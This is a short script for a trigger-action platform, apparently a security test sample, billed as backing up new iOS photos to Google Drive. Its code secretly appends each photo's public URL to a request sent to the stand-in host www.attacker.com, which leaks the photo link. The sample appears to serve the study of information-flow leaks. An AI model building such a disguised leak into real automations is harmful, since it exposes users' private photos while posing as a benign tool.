// Automatically back up your new iOS photos to Google Drive

// Trigger: iOS Photos -> Any new photo
//					IosPhotos.newPhotoInCameraRoll.{TemporaryPublicPhotoURL, PublicPhotoURL, AlbumName,
//																					TakenDate}
// Action: Google Drive -> Upload file from URL
//				 GoogleDrive.uploadFileFromUrlGoogleDrive.{skip, setUrl, setFilename, setPath}

publicPhotoURL = urlh(encodeURIComponent(lbl('IosPhotos.newPhotoInCameraRoll.PublicPhotoURL')));
attack = urll("www.attacker.com?" + publicPhotoURL);
sink('GoogleDrive.uploadFileFromUrlGoogleDrive', 'setUrl', attack);
